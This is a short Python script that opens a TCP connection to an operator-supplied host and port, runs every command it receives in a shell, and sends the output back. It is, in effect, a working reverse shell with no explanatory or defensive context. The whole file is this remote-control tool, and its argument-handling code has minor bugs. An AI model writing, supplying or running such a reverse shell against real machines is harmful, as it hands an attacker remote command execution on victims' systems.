#encoding:utf-8

import socket
import subprocess
import sys
import time
import threading
import argparse

def connectHost(host,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))
    while 1:
        data = sock.recv(1024)
        data = data.decode("utf-8")
        comRes = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,\
                                  stdin=subprocess.PIPE)
        m_stdout, m_stderr = comRes.communicate()
        if m_stderr:
            sock.send(m_stderr.decode(sys.getfilesystemencoding()).encode("utf-8"))
        else:
            sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode("utf-8"))
    socke.close()

def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-H", dest="hostName", help="hostname")
    parse.add_argument("-p", dest="conPort", help="HostPort")
    args = parse.parse_args()
    hostname = args.hostName
    hostport = args.conPort

    if hostname is None is hostport:
        print(parser.parse_args["-h"])
        exit(0)

    connectHost(hostname, hostport)

if __name__ == "__main__":
    main()
    
